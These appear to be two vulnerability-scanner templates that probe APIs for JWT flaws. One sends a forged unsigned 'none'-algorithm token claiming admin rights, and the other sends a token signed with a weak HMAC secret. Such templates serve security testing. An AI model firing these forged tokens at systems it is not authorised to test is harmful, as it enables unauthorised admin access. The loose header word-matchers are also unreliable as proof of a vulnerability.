id: jwt-none-alg
info:
  name: JWT None Algorithm
  author: AniipID
  severity: critical
  description: Tests for JWT none algorithm signature bypass
  tags: jwt,auth,bypass
requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/user"
      - "{{BaseURL}}/admin"
      - "{{BaseURL}}/api/admin"
    headers:
      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0."
    matchers:
      - type: word
        words:
          - "admin"
          - "Welcome"
          - "Dashboard"
          - "200 OK"
        condition: or
        part: header
        name: "jwt-none-alg-accepted"
---
id: jwt-weak-secret
info:
  name: JWT Weak HMAC Secret
  author: AniipID
  severity: high
  description: Tests for JWTs signed with weak/common HMAC secrets
  tags: jwt,auth,weak-secret
requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/user"
      - "{{BaseURL}}/api/admin"
    headers:
      Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.4fGVAj7l7WLd5m0-fQ1NEpB_TK4Dn6sx8aNnC4B1Jwg"
    matchers:
      - type: word
        words:
          - "admin"
          - "200 OK"
        condition: or
        part: header
        name: "jwt-hs256-accepted"
